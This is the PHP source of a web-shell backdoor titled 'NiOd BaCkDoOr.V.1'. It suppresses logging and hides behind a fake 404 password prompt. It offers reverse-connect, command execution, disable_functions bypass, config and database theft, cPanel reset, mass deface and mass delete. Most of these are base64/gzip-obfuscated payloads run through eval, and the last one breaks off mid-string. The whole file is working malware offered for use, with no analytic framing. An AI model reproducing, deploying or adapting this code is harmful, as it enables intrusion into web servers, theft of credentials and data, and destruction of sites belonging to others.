<?php
@error_reporting(0);
@set_time_limit(0);
	if(version_compare(PHP_VERSION, '5.3.0', '<')) {
		@set_magic_quotes_runtime(0);
}
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if(get_magic_quotes_gpc()) { 	
function VEstripslashes($array) { 		return is_array($array) ? array_map('VEstripslashes', $array) : stripslashes($array); 	} 	
$_POST = VEstripslashes($_POST); 
$_COOKIE = VEstripslashes($_COOKIE); } 
function Login() {
	die("<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>
<style>input { margin:0;background-color:#fff;border:1px solid #fff; }</style>
    <pre align=center><form method=post><input type=password name=pass></form></pre>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="robots" content="noindex, nofollow">
<meta name="theme-color" content="#434343">
<title>NiOd BaCkDoOr.V.1</title>
<link href="https://fonts.googleapis.com/css2?family=Metal+Mania&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<link rel="icon" href="https://www.cukimay-cyber-team.my.id/img/Noniod7.png" type="image/jpeg">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css"></script>
<script src="http://code.jquery.com/jquery-2.1.3.min.js"></script> 
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
<link href="https://fonts.googleapis.com/css?family=Press+Start+2P" rel="stylesheet">
<style>
body{
font-family: "kelly slab",cursive;
background-color:#000d2a;
color:white;
}
#content tr:hover{
background-color:#434343;
}
.NioD {
background-color:#434343;
}
.pejoe {
background: #434343;
padding:6px 6px;
border-radius:6px;
}
.pejoe:hover {
background-color:#F30A00;
color:#FFFFFF;
}
.niod {
background: transparent;
}
.niod:hover {
background-color: transparent;
color:#FF2100;
}
.we {
color: red;
font-size: 35px;
font-family: "Metal Mania", cursive;
text-shadow: 0px 2px 0px #8A8A8A;
}
table{
border: 1px white solid;
}
a{
color:white;
text-decoration: none;
}
a:hover{
color:white;
}
input,select,textarea{
border: 1px #7B7B7B solid;
-moz-border-radius: 4px;
-webkit-border-radius:4px;
border-radius:4px;
color: black;
}
h1 {
font-family:"Press Start 2P";
color:#4c83af;
text-align:center;
font-size:2em;
margin-bottom:30px;
text-shadow:-1px 0 #bfc0c0,0 1px #bfc0c0,1px 0 #bfc0c0,0 -1px #bfc0c0
}
</style>
</head>
<body>
<center><h1><font color="red" class="niod"><i class="fa fa-terminal" style="font-size:40px;color:red;"></i>NiOd BaCkDoOr.V.1</h1></font></a>

<a style="background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; "href="?"><i class="fa fa-home" style="font-size:15px;color:red;"></i> HoMe</a>

<button type="button" class="btn btn-primary collapsed" style="background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff;" data-toggle="collapse" data-target="#mc"><i class="fa fa-terminal" style="font-size:15px;color:red;"></i> LiSt ToOLs </button> 

<a style="background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; "href="?path=$path&niod=killme"><i class="fa fa-power-off" style="font-size:15px;color:red;"></i> KIiLl Me!</a>
</center>
<table width="900" border="0" cellpadding="3" cellspacing="1" align="center">
<center><tr><td><font>Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
$sys = php_uname();
$home_r = $_SERVER['DOCUMENT_ROOT'];
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$ipmu = gethostbyname($_SERVER['REMOTE_ADDR']);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? '<font size=2 >ON</font>' : '<font size=2 >OFF</font>';
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font size=2 color=#B0B0B0>$ds</font>" : "<font size=2 color=#B0B0B0>NONE</font>";
$mysql = (function_exists('mysql_connect')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$wget = (exe('wget --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2 color=#B0B0B0>OFF</font>";
$perl = (exe('perl --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<font size=2  color=#B0B0B0>OFF</font>";
$python = (exe('python --help')) ? "<font size=2 color=#B0B0B0>ON</font>" : "<fontsize=2  color=#B0B0B0>OFF</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
echo "<div id='mc' class='collapse'><hr><center>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=adminer'>AdMiNeR</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=autoeu'>AuTo EdIt UsEr</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=bypdisf'>ByPaSs DiSfUnCtIoNs</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=backcon'>BaCk CoNnEcT</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=cmd'>CoMmAnD</a><br><br>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=cpanel'>CpAnEl ReSeT</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=config'>CoNfIg</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=rdp'>K - RdP</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=domains'>DoMaInS</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=dbdump'>DB DuMp</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=info'>InFo</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=jumping'>JuMpInG</a><br><br>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=mass_deface'>MaSs DeFaCe</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=mass_delete'>MaSs DeLeTe</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=sym403'>SyM 403</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=smtp'>SmTp</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=upload'>UpLoAd</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=vhost'>VhOsT</a>
<a style='background:#112; margin:5px; padding:6px; text-align:center; color: #fff;
-moz-border-radius: 9px;-webkit-border-radius:9px;border-radius:9px;border:1px solid #fff; 'href='?path=$path&niod=zoneh'>ZONE-H</a>
<hr></center></div>";

if($_GET['niod'] == 'upload') {
eval(gzinflate(base64_decode('jZDRSsMwFIbvB3uHLA7SgS4oXghLA4KbiIOOzl0NGVmb0kDShPRUGLJ3t+lWRQUx5+ZPzsd3wlFFpOpaQjTeLZ6W8/WWFEpL8jqZvA8Hqogy6w4/e1sCxu0qYdp8OXYCyimhZPqLOhGdSWalRZhlsgLpOStsBSiz2vr4YtEdvlktk/sHlDwzGrqc0R4ufY9ez0NxPBsOjlLX8m/x3W2oXjxP0yQd/VN+PIvJp7i84RunrcgZbWM7xxskqwwOTsbYNBqUEx5oeL/KBQiMjITS5jFeJesXzJmqXAPoxIcFYRTW02f6HaibvVGA0ZvQTXt9TEa4JTo7Z3v/9X8y+wA=')));
} elseif($_GET['niod'] == 'info') {
eval(gzinflate(base64_decode('lZJLa4NAFIX3hf6HCw1MhGJLl9a46CNJodI0D0pWwehEB9RrZ8YGiz++Mz4KKa1WXTicOed8Vx3qRwjEPmAqwccY+eRiWl0g2Ced3DirQkiagAW1p1Zb6921vh1ijkQhTGLvuWNfaV/7OD/rqqb8g3J4WvS2s8wkv1rqQqdscB0ecLaYt7Bmxh5mkg9/Je9AwcWA9n+wZHD5AxPePqYBTPPUlwxT0U+J8LgLhv+aOSYUloiylxAp544PBqyZAryk0JyBlvKzPvAkHZMAXNjC3GKWIJdSJceGoYgnNM3vJG5EB2eUq93vShhrhQUmMaCEGcc8+zsZ6u3TaFhF/zuYW6xen1W/CiaFeI/VUS9hQXlca5la1VIhI0wbsVpX8tvscV2Lx5DKSrrfLJtCP9dhPQK5/QI=')));
} elseif($_GET['niod'] == 'cmd') {
eval(gzinflate(base64_decode('TVHLasMwEDzX4H9YTEDxIbihN1vypR/QQnspJQTF2tiilmQsOY+W/HtXcUp6EcuMZnZGwqZzkPEGbcCx5ns3GjAYOqcEG5wPLGI21M/OGGkVlMCLK5AmXNthChDOAwoW8BQYeP1N89Mjgw512wXB1jRbaQhtZgcy/K/z087ocL/TG/xS2DE4yH4ipKb7RUxVZ1WaPOj9UnuPYbnYvr68vX/+U2zyHH7SBKkQ40ofwIdzjyIzcmy1LdfDqRqkUtq21zkGXslet7acy1dk5cby2OmAVVbzYcSa0c5FYxQIuC+ca2yIojQzKyDL8jS5rYfsQ9oWdmhxBOmPq23MDhcguvd470DanGQxNizcFOKzCMATzlQUXf1uXAWXv35FTMcLqknn7fNi2Msv')));
} elseif($_GET['niod'] == 'config') {
eval(gzinflate(base64_decode('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')));
} elseif($_GET['niod'] == 'zoneh') {
eval(gzinflate(base64_decode('pZRRa9swEMefM9h3ECbUKaRVCyuD1BaUNYWx0hQnfVpKUORzJGpLRpabpKXffZJlp6MNbOueLMl3vzv9704iG/QXt5Pp7GdY1ctCmPD+ED1//tTr9VNVUCFRjGBT5iqFQTDXcxkMUedQ69xanzfGUrAHa7r75/bhffMPGFcouISMMtBoIrnK0xGKKOIasjjkxpQjjNfr9fGTknDEj5VeYaoZF4+ApTIiE6DjJgIu62UuKg5pfBIiQ/UKTBwuljmVDyH5KCnClERLTYI96V547w/m+385dnm95pbVkhmhJHK+fNC3FRg2pm3Nen3GbRWYPV8IKcwgeB+PqcLH2eJKyFUOgS9hr4e8YwVGlWZgUUP07S65ntzOFsl4dpfczJKLm+nVOBkio2v4CzfXC/9kfPV9fH05HaIg9fp7IQ58K57G7sIHnLKHwvZjfHqggVZK2oXv3XgKMu2uo8HUWvpwsAHmgr3JguWqgtfzl0ZiZaHMatu2P62Qi7oTuFHeavyuAh4tskGpYbUoqLGQADOVKx3PAw3pPCCTH9EcZ0oaYr+5IFi4cWpQh12EtgEdGR0RFDlz5DG5KMAxWsSuLXovCPIK/gywWZBxkkySPYhOgd9ZnhQxkAZsH1ptClSA4SqNw1JVJiTOKqpJOy4RrokdFUttzoUsa4PMtoQ4NLAxIZK0sGs/GpV4suszO8iPNK/t8kZJodKvIdkBLLipQvUG7GDU1glVZptbz7VIDR+hL2cn5eYccRArbkbotNl2Qd1rRSLcuZK9WbZvYOvS7dr8pu12X9BWCewk8pI6LVv9cCtgcP4L')));
} elseif($_GET['niod'] == 'sym403') {
eval(gzinflate(base64_decode('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')));
} elseif($_GET['niod'] == 'jumping') {
eval(gzinflate(base64_decode('1VjbbuM2EH12gf7DlGtAcjc10wL74ljaAu1LFwVabAv0IQgEWqIsprqBpCwb3fx7h6Iu9CXZbNAW2wCJJM6FM8M5R6PMBQRwffPlFzMeZxWQdSJ2EOdMqcArmNyKcgVv6j2wRlc3XkiMpkj9WvJtVDAdZz6hmaozLjklVzBPhFws4C/Ums0bmSv0zvd1XiXcJ7I0GtGvv/z2+62HQu9uYdwZf0Iprv1Bdt8UNQp7P0NkuKfdfzZLK8kZ7m23YArMzaDebYz7Ki0jyeucxdxnUrKDTzKt6xXFQEnbtkuyuAKCIaGirvKq5bJzuLBRoR+uY/RDKF5pjSVpEzKIUhSkVc1L32hdEUkGqzYTOffnW65N8qm5+vN0TAZtax6zzC3MytTFKA4+MAXFJapY3dvru1GABY564VT5vIpZTrOq4LSzHMK0pY3Qxh8NFxAEAWjZ8CmkrmSD21FzSShZGsngrXeHtU/YxiQ5WDnZoS/x+vXN9HQvWxPr7TqtSg0xFloGB55jvcP3a2oWwztYM8gkTwPvbc10FoyOvfCC2SjtzdeUhWTa0QbZSqGfCPJyXFvJeRm+/+MT47JmHwnrYbzr+tnsvyTrjXR0BpX+ai8PPUTmiFSEKiYBZuUBeK74MULQ2U8l6EqzHLRpDGD4i2colgRQ8k3YPdTdhp3f3pBO2Dr3661jXmouQxsVAKYuCyi4zqokIHWlNBllPwul4ceqYKJUKzARjVaa7zXGw6BkBQ8IVosg9A453rci0RkSzfV1vb+BjIttplfw3RvzSELPFmie1iPoTls/rspUbKnBd0KV0FzZv0u918RBpwNOF5311Bv2cDqFm6n+dhlLQYcswqPcRFk3GvShxmRUsymEJrBjeYOP75DMRLklfdqG2z6ad5f26JyaemM79cfgjcdnz+qUjncZnoj6fNi45Ztol3V8tWOSIvMOIRo9e2ZVrAYYOJRlLS8R1ikR9Zouo7ks9DISsk4vU5CVXUT6Kf+cx/ZC8rkUT089T4Qz8s5jtPMvsg0k4v/MOOhjg9D1iahXmMRAIp8xF9gqnkG0n2QG7nTmGZyAkByhknhUSApua0mehD+w0tNgcAaOVd9nfT16TrWiiVRRfex501CDPADPgw8f4KtO44h2P3H7np/d9plNTBixPPc96i+/frtY7VfUQ7az9nhjXtPRvT2NYeiaaMwR3n571zFacRhXnUnO1TSUZYeybgxzDGjdbHIRR5ku8pPJzBmlTlz9w1x26v6RwepE61n89lTkLx2znox2GLeeE+w5+7l5pE0Za1GVEd8jiyjfQ2oR+wgbuG4bkXjHqSQdyXRbmjbHrjeaEc4eGtGoemAZaCdLM5A